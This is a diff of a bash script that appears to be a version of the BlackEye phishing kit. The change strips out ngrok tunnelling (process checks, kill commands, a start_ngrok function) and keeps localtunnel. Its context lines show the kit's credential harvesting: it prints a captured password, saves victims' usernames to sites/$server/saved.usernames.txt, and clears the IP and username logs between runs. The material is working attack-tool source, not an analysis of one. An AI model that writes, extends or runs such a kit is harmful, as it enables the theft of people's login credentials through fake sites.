@@ -1,7 +1,6 @@
 #!/bin/bash
 
 # Upgraded by: @Git-Ankitraj (https://github.com/Git-Ankitraj/blackeye-im)
-#Enhanced ngrok tunnelling
 trap 'printf "\n";stop;exit 1' 2
 menu() {
 
@@ -194,13 +193,8 @@ fi
 
 stop() {
 
-checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checknode=$(ps aux | grep -o "node" | head -n1)
-if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-fi
 if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
@@ -277,7 +271,6 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
 killall -2 node > /dev/null 2>&1
 exit 1
 
@@ -343,15 +336,6 @@ sleep 1
 start_localtunnel
 }
 
-start_ngrok() {
-if [[ -e sites/$server/ip.txt ]]; then
-rm -rf sites/$server/ip.txt
-
-fi
-if [[ -e sites/$server/usernames.txt ]]; then
-rm -rf sites/$server/usernames.txt
-
-fi
 start_localtunnel()  {
 if [[ -e sites/$server/ip.txt ]]; then
 rm -rf sites/$server/ip.txt
